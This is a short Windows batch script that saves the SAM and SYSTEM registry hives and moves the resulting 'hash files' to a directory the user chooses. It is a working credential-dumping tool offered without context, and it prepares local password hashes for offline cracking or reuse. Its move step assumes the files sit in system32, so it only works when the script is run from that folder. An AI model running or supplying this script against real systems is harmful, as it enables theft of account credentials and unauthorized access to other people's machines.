@echo off

reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

echo "Enter the path of the directory you want to save the hash files to:"
echo "example format: X:\"
set /p dir=

move C:\windows\system32\sam.save %dir%
move C:\windows\system32\system.save %dir%
pause
